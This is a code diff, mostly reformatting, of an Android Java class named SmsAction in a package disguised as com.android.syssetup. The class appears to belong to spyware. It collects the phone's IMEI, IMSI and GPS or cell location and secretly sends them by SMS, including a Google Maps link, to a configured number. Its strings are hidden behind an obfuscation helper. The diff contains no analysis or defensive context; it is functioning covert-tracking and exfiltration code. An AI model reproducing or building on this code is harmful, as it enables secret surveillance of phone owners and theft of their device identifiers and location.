@@ -9,12 +9,10 @@
 
 package com.android.syssetup.action;
 
-import java.util.Date;
-import java.util.Locale;
-
 import android.location.Location;
 import android.telephony.SmsManager;
 
+import com.android.mm.M;
 import com.android.syssetup.CellInfo;
 import com.android.syssetup.Device;
 import com.android.syssetup.Trigger;
@@ -26,7 +24,9 @@ import com.android.syssetup.module.position.GPSLocationListener;
 import com.android.syssetup.module.position.GPSLocatorAuto;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
+
+import java.util.Date;
+import java.util.Locale;
 
 /**
  * The Class SmsAction.
@@ -34,33 +34,55 @@ import com.android.mm.M;
 public class SmsAction extends SubAction implements GPSLocationListener {
 	private static final String TAG = "SmsAction"; //$NON-NLS-1$
 
-	/** The Constant TYPE_LOCATION. */
+	/**
+	 * The Constant TYPE_LOCATION.
+	 */
 	private static final int TYPE_LOCATION = 1;
 
-	/** The Constant TYPE_SIM. */
+	/**
+	 * The Constant TYPE_SIM.
+	 */
 	private static final int TYPE_SIM = 2;
 
-	/** The Constant TYPE_TEXT. */
+	/**
+	 * The Constant TYPE_TEXT.
+	 */
 	private static final int TYPE_TEXT = 3;
 
 	private final SmsManager sm;
 
-	/** The number. */
+	/**
+	 * The number.
+	 */
 	String number;
 
-	/** The text. */
+	/**
+	 * The text.
+	 */
 	String text;
 
-	/** The type. */
+	/**
+	 * The type.
+	 */
 	int type;
 
 	private String descrType;
 
 	/**
+	 * Instantiates a new sms action.
+	 *
+	 * @param params the conf params
+	 */
+	public SmsAction(final ConfAction params) {
+		super(params);
+
+		sm = SmsManager.getDefault();
+	}
+
+	/**
 	 * Parses the.
-	 * 
-	 * @param confParams
-	 *            the conf params
+	 *
+	 * @param confParams the conf params
 	 * @return true, if successful
 	 */
 	@Override
@@ -84,42 +106,42 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 			}
 
 			switch (type) {
-			case TYPE_TEXT:
-				// TODO controllare che la lunghezza non sia superiore a 70
-				// caratteri
+				case TYPE_TEXT:
+					// TODO controllare che la lunghezza non sia superiore a 70
+					// caratteri
 
-				text = params.getString(M.e("text"), M.e("No Text"));
-				break;
+					text = params.getString(M.e("text"), M.e("No Text"));
+					break;
 
-			case TYPE_LOCATION:
-				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-				break;
+				case TYPE_LOCATION:
+					// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+					break;
 
-			case TYPE_SIM:
-				final StringBuffer sb = new StringBuffer();
-				final Device device = Device.self();
+				case TYPE_SIM:
+					final StringBuffer sb = new StringBuffer();
+					final Device device = Device.self();
 
-				if (Device.isCdma()) {
-					// sb.append("SID: " + device.getSid() + "\n");
-					// sb.append("ESN: "
-					// + NumberUtilities.toString(device.getEsn(), 16)
-					// + "\n");
-				}
+					if (Device.isCdma()) {
+						// sb.append("SID: " + device.getSid() + "\n");
+						// sb.append("ESN: "
+						// + NumberUtilities.toString(device.getEsn(), 16)
+						// + "\n");
+					}
 
-				if (Device.isGprs()) {
-					sb.append(M.e("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-					sb.append(M.e("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-				}
+					if (Device.isGprs()) {
+						sb.append(M.e("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+						sb.append(M.e("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					}
 
-				text = sb.toString();
-				break;
+					text = sb.toString();
+					break;
 
-			default:
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);//$NON-NLS-1$
-				}
+				default:
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);//$NON-NLS-1$
+					}
 
-				break;
+					break;
 			}
 		} catch (final ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
@@ -135,18 +157,6 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		return true;
 	}
 
-	/**
-	 * Instantiates a new sms action.
-	 * 
-	 * @param params
-	 *            the conf params
-	 */
-	public SmsAction(final ConfAction params) {
-		super(params);
-
-		sm = SmsManager.getDefault();
-	}
-
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -157,18 +167,18 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 
 		try {
 			switch (type) {
-			case TYPE_TEXT:
-				sendSMS(text);
-				return true;
+				case TYPE_TEXT:
+					sendSMS(text);
+					return true;
 
-			case TYPE_SIM:
-				text = M.e("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
-				sendSMS(text);
-				return true;
+				case TYPE_SIM:
+					text = M.e("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
+					sendSMS(text);
+					return true;
 
-			case TYPE_LOCATION:
-				getGPSPosition();
-				return true;
+				case TYPE_LOCATION:
+					getGPSPosition();
+					return true;
 			}
 			return true;
 		} catch (final Exception ex) {
@@ -196,7 +206,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 
 	/**
 	 * Gets the cell position.
-	 * 
+	 *
 	 * @return the cell position
 	 */
 	private boolean getCellPosition() {
@@ -221,16 +231,15 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	 * Gets the gPS position.
 	 */
 	private void getGPSPosition() {
-		if(!GPSLocatorAuto.self().start(this)){
+		if (!GPSLocatorAuto.self().start(this)) {
 			getCellPosition();
 		}
 	}
 
 	/**
 	 * Send sms.
-	 * 
-	 * @param text
-	 *            the text
+	 *
+	 * @param text the text
 	 */
 	private void sendSMS(final String text) {
 		sm.sendTextMessage(number, null, text, null, null);
@@ -260,14 +269,14 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 
 	@Override
 	public void onLocationChanged(Location location) {
-		
+
 		GPSLocatorAuto.self().unregister(this);
 		if (location == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " location is null");
 			}
 
-			if(!getCellPosition()){
+			if (!getCellPosition()) {
 				errorLocation();
 			}
 			return;
@@ -275,17 +284,17 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 
 		final double lat = location.getLatitude();
 		final double lng = location.getLongitude();
-		
-		String text = String.format(Locale.US, M.e("lat:%.5f lon:%.5f"), lat,lng);
+
+		String text = String.format(Locale.US, M.e("lat:%.5f lon:%.5f"), lat, lng);
 		final Date date = new Date(location.getTime());
-		
+
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " " + date +" " + text);//$NON-NLS-1$ //$NON-NLS-2$
+			Check.log(TAG + " " + date + " " + text);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		String instance = new String(Keys.self().getBuildId());
 		String textMaps = String.format(Locale.US, M.e("https://maps.google.com/maps?q=%.5f,+%.5f"), lat, lng);
-		
+
 		sendSMS(textMaps);
 
 	}
